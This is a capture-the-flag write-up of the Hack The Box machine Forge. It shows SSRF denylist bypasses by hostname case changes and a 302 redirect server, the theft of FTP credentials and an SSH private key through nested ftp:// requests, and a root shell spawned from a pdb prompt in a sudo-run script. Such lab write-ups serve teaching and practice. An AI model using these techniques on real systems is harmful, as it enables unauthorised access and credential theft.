---
title: "Forge — Two Ways Past an SSRF Denylist, and a Debugger Left Open"
date: 2026-09-08
draft: false
tier: offensive-deep
summary: "An upload form blocks the hostnames that matter, and both case manipulation and a redirect server get around it. An announcements page hands over FTP credentials, FTP hands over an SSH key, and a sudo script drops to a pdb prompt when you feed it the wrong type."
categories:
  - Offensive
tags:
  - Forge
  - Hack The Box
  - Linux
  - Web
  - SSRF
  - Python
ShowToc: true
TocOpen: false
---

## Overview

**Box:** Forge (Hack The Box) · **OS:** Linux

The SSRF bypass on this one is neat, and there are two separate ways to do it. Case manipulation gets past the denylist on its own, and if that had not worked, a redirect server on our own box sends the application somewhere it would have refused to go directly.

The other interesting piece is how we read the result. The upload form fetches a URL and stores what comes back as an image, so the raw HTML of whatever page we asked for ends up sitting in that file. One of those pages exposes an `/announcements` endpoint carrying FTP credentials, and the admin site has its own `/upload?u=` endpoint that supports `ftp://`. Reaching that endpoint through the public uploader gets us the user flag and then the user's SSH key.

Escalating comes down to a script that runs under `sudo` with no password and enters the Python debugger after malformed menu input. Run it in one session, connect to it from a second, and feed it something it does not expect. The first session drops to a `pdb` prompt, still running as root.

## Recon

An nmap scan shows two open ports, 80 and 22, with 21 filtered.

Add `forge.htb` to the hosts file. The page has an upload feature.

Directory and subdomain scans turn up the interesting bits:

```bash
gobuster vhost -u http://forge.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r --append-domain
```

That hits on `admin.forge.htb`, which goes in the hosts file too.

The directory wordlist was not named in my notes. Replace `WORDLIST_PATH` with the path to your installed wordlist:

```bash
gobuster dir -u http://forge.htb -w WORDLIST_PATH
```

That reveals `/upload`. We did not strictly need the directory scan to find it, since the form is linked from the page, but it is good practice and it sometimes turns up more than you went looking for.

### What the upload actually does

We cannot upload a PHP webshell and call it. And `admin.forge.htb` refuses us, because it only serves requests from localhost.

The form will fetch from a URL, though. So the next avenue is SSRF, and there is now a specific reason to want it: `admin.forge.htb` is a page we are not allowed to see, and the application is allowed to see it.

Testing `127.0.0.1` or `forge.htb` comes back with `URL contains blacklisted address`. So there is a denylist, and the question is what it misses.

## Foothold

### Choose your adventure

My notes cover two approaches.

The first is case manipulation. `http://127.0.0.1` and `http://forge.htb` triggered the denylist. My notes also record an unsuccessful `http://127.1` attempt, but do not preserve its error response. In [0xdf's separate tests](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#bypassing), `127.1` passed the filter. I cannot attribute my failed attempt to the denylist.

`http://ADMIN.FORGE.HTB` goes through. My read is that the check compares strings while DNS does not care about case, so the uppercase form is a different value to the filter and the same host to the resolver.

The second way is a redirect. Stand up a server on our own box that answers every request with a 302 pointing wherever we like, then feed the application our address, which is not on the denylist. It follows the redirect to the destination it would have refused directly:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler


class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[1])
        self.end_headers()


HTTPServer(('0.0.0.0', 80), Redirect).serve_forever()
```

Save this as `redirect.py`. This version corrects the `end_response()` typo in the notes to `end_headers()`. It listens on port 80, which needs root, so run it under `sudo`. The URL supplied to the upload form is our server's address, while the command argument is the redirect destination.

```bash
sudo python3 redirect.py http://admin.forge.htb
```

Case manipulation was easier to repeat here: edit the target URL in the upload request, then retrieve the resulting file. That let us keep exploring the admin site.

### Reading a page we are not allowed to load

Submitting the URL gives us a link to the saved upload. Copy that link and send a separate GET request to it in Burp. The body of this second response contains the admin page's HTML. That is what we read for the next endpoint.

Repeat both steps for each new target: submit its URL through the public upload form, then GET the new upload link it returns.

This retrieval sequence is also documented in [0xdf's write-up](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#ssrf--redirection-summary). The case-based route to the admin uploader and SSH key is independently described by [evyatar9](https://forum.hackthebox.com/t/forge-writeup-by-evyatar9/250850).

The admin page mentions an `/announcements` directory. Point the same SSRF at it:

```text
http://ADMIN.FORGE.HTB/announcements
```

```text
An internal ftp server has been setup with credentials as user:heightofsecurity123!
The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
The /upload endpoint has been configured for easy scripting of uploads, and for uploading an
image, one can simply pass a url with ?u=<url>
```

That one paragraph gives up the credentials, tells us the uploader speaks `ftp://`, and names the parameter for driving it from a URL.

### Turning the uploader into an FTP client

Now the requests stack. We ask the admin host's own `/upload` endpoint, through the case-manipulated SSRF, to fetch an `ftp://` URL with the credentials embedded:

```text
http://ADMIN.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb
```

The `?u=` parameter carries the FTP URL, credentials and all. That is the filtered port 21 from the nmap scan, answering to a request that originates on the box.

After submitting that nested URL, GET the newly returned upload link. Its body contains the FTP directory listing:

```text
snap
user.txt
```

We repeated the upload-and-GET sequence for `snap` and `user.txt`, which gave us the first flag.

Those same credentials did not get us an SSH session; the SSH attempt required a key. So let's go get the key:

```text
http://ADMIN.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa
```

This one I submitted through the browser rather than Burp. Burp was returning internal server errors, probably mangling the URL encoding somewhere. Letting the browser build the request and reading the response in Burp worked.

Retrieve the resulting upload as above and save the OpenSSH private key as `id_rsa`. Then connect with it:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@forge.htb
```

We are in.

## Privilege escalation

### The script we are allowed to run

```bash
sudo -l
```

```text
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

We cannot modify the script, so let's read it. The notes preserve these imports:

```python
import socket
import random
import subprocess
import pdb
```

The script prints a localhost port and accepts a connection there.

The [published source](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#enumeration) also shows `subprocess.getoutput()` calls for its menu actions. My initial notes overlooked those calls.

### The wrong turn

My first instinct was to check the library versions and look for a known CVE.

```bash
pip freeze
```

That did not work. Re-assess.

These four imports are Python standard-library modules. `pip freeze` lists installed packages, so it does not give us individual versions of these modules to investigate. [Python standard library](https://docs.python.org/3/library/index.html), [pip freeze documentation](https://pip.pypa.io/en/stable/cli/pip_freeze/).

### The debugger was the point

After authenticating and entering `asdf` at the menu, the session running the sudo script drops to a `pdb` prompt. My notes record that result. Checking [0xdf's captured source](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#exploit) during preparation supplies the missing mechanism. The menu input is converted here:

```python
option = int(clientsock.recv(1024).strip())
```

`asdf` raises `ValueError`. The enclosing exception handler invokes:

```python
pdb.post_mortem(e.__traceback__)
```

An interactive `pdb` session can execute Python in the debugged process. Here we could type into that prompt in the terminal running the script under sudo. That is what made it useful for root access. [Python debugger documentation](https://docs.python.org/3/library/pdb.html).

So the sequence needs two sessions.

**Session A**, run the script under sudo. It prints the port it is listening on:

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
```

**Session B**, a second SSH connection as the same user. Replace `PORT` with the value printed in session A:

```bash
nc localhost PORT
```

When the program asks for its password, enter the value recorded from reading the script:

```text
secretadminpassword
```

Now, at the menu, give it something that is not a number:

```text
asdf
```

The `(pdb)` prompt appears back in **session A**, the one running under `sudo`.

From that `(pdb)` prompt:

```python
import os; os.system('/bin/bash')
```

Root, because the process was root the whole time. GG.

## What didn't work

- **Uploading a webshell.** I did not find a way to execute an uploaded PHP webshell. The next useful test was whether the URL feature would fetch an internal page.
- **The obvious SSRF payloads.** `http://127.0.0.1` and `http://forge.htb` were refused by the denylist. My `127.1` attempt was also unsuccessful, but its cause remains unknown. The case-manipulated hostname got us to the admin page.
- **Hunting a library CVE for the privilege escalation.** `pip freeze` and a search through the versions gave nothing. Returning to the script and testing its menu input led to the debugger.
- **Reusing the FTP credentials over SSH.** The SSH attempt required a key, which sent me back to the FTP read for `.ssh/id_rsa`.
- **Sending the FTP payload through Burp Repeater.** Internal server errors, probably encoding, though I did not pin it down. The browser handled the same URL fine.

## Takeaways

The case change was useful because it gave us a request we could keep editing as we explored the admin page. The redirect approach in the notes offered another way to reach it. Those are two specific tests to carry forward when a URL is being rejected.

The part I want to remember about the SSRF is where the response went. The initial upload response gave us the saved file's link. A GET to that link returned the content we wanted, even when it was HTML or an FTP result instead of an image.

For privilege escalation, the library-version search did not get us anywhere. Going back to the script and submitting `asdf` brought up the debugger in the session already running as root. The important part was that we could interact with that prompt and execute Python there.
